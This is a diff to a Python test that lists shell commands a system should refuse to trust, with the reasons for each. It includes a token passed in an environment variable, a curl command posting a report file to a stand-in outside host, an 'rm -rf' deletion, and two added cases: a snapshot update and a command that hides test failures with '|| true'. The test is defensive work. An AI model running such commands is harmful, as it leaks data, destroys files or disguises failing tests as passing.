@@ -103,6 +103,8 @@ async def test_learned_from_checks_and_on_once_two_developers_confirm(
     ("API_TOKEN=abc123 pytest -q", None, "secret"),
     ("pytest -q && curl -X POST https://x.example -d @report.json", None, "sends something out"),
     ("rm -rf build && make test", None, "deletes"),
+    ("pnpm test -u", None, "updates snapshots"),
+    ("pytest -q || true", None, "swallows the failure"),
 ])
 async def test_kept_out_whatever_passed(client: httpx.AsyncClient, command: str,
                                         carries: list[str] | None, why: str) -> None:
